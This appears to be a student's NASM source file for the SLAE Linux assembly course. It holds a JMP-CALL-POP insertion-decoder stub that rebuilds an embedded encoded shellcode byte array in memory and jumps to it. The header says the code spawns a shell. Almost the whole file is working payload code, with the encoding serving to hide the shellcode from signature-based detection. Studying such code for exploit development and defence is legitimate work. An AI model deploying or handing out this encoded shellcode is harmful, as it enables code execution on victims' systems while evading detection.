; Filename: shell_insert-decoder.nasm
; Author:  Marco Lugo (SLAE-1031)
; Description: spawns a shell
;
; For the SecurityTube Linux Assembly Expert (SLAE) course
; Using the JMP-CALL-POP method, decodes the shellcode in memory by shifting bytes in memory until the original shellcode is reassembled
; The original unencoded shellcode comes from: shell_direct-stack.asm
; The resulting shellcode is 83 bytes

global _start

section .text

_start:
        jmp step1 ; unconditional jump to step1

step2:
        pop edi ; retrieves the address of Shellcode
		xor eax, eax
		xor ebx, ebx
		xor edx, edx
		xor ecx, ecx ; assigns 0x00 to ECX
        mov cl, 0x32 ; assigns 50 to ECX
		
decode:
		mov dl, [edi+ebx] 
		mov byte [edi+eax], dl
		inc al
		add bl, 0x02
        loop decode ; continue with the loop (jumps back to decode)

        jmp Shellcode ; with the shellcode now fully decoded, jump to it for execution

step1:
        call step2 ; jumps to step2 while pushing the address of Shellcode to the stack
        Shellcode: db 0x31,0xd3,0xc0,0x75,0x50,0xda,0x68,0x87,0x2f,0x3f,0x2f,0xe8,0x73,0x6a,0x68,0xc2,0x68,0xaf,0x2f,0x19,0x62,0xbf,0x69,0x11,0x6e,0xdf,0x89,0x2a,0xe3,0x90,0x50,0x79,0x89,0x2e,0xe2,0x05,0x53,0x3d,0x89,0x8b,0xe1,0x70,0xb0,0x92,0x0b,0x90,0xcd,0x8e,0x80,0x94
